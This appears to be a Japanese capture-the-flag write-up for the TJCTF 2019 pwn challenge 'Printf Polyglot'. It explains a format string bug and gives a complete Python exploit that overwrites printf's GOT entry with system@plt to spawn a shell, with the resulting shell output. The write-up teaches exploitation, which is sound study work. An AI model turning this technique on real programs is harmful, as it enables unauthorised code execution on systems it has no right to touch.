# [pwn 120pts] Printf Polyglot - TJCTF 2019
64ビットでRELROやPIEは無効です。
```
$ checksec -f printf_polyglot
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable  FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   77 Symbols     Yes	0		4	printf_polyglot
```
ソースコードも配られており、system関数が使われています。
```c
   if (date_enabled) {
      system("/bin/date");
   } else {
   ...
```
また、Format String Bugがありますが、その関数の終わりに強制的にセグフォします。
```c
void newsletter() {
   printf("Thanks for signing up for our newsletter!\n");
   printf("Please enter your email address below:\n");
   
   char email[256];
   fgets(email, sizeof email, stdin);
   printf("I have your email as:\n");
   printf(email);
   printf("Is this correct? [Y/n] ");
   char confirm[128];
   fgets(confirm, sizeof confirm, stdin);
   if (confirm[0] == 'Y' || confirm[0] == 'y' || confirm[0] == '\n') {
      printf("Great! I have your information down as:\n");
      printf("Name: Evan Shi\n");
      printf("Email: ");
      printf(email);
   } else {
      printf("Oops! Please enter it again for us.\n");
   }
   
   int segfault = *(int*)0;
   // TODO: finish this method, for now just segfault,
   // we don't want anybody to abuse this
}
```

同じemailが2回printfされるので、1回目でprintfのGOTアドレスをsystem@pltに変え、2回目で`system("/bin/sh")`が発動するようなコードを作りましょう。
ptrlibで一発ですね。

```python
from ptrlib import *

elf = ELF("./printf_polyglot")
sock = Process("./printf_polyglot")
plt_system = 0x4006e0

sock.recvuntil("Exit.\n")
sock.sendline("3")
sock.recvuntil("below:\n")

writes = {elf.got("printf"): plt_system}
payload = b'/bin/sh;`'
payload += fsb(
    pos = 24,
    writes = writes,
    written = len(payload),
    bs = 2,
    bits = 64
)
assert len(payload) < 0x100
sock.sendline(payload)
sock.sendline("Y")
print(payload)

sock.interactive()
```

systemの引数として認識されるemailにバッククオートが1つ入っていてsystemが失敗するので、始めは`/bin/sh;`でなく`/bin/sh;\``にする点に注意です。
```
$ python solve.py
...
id
                     AAAH `sh: 1: Is: not found
Great! I have your information down as:
Name: Evan Shi
sh: 1: Email:: not found
uid=1000(ptr) gid=1000(ptr) groups=1000(ptr),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare),999(docker)
[ptrlib]$
```

# 感想
FSBにもはや敵なし。(嘘です)
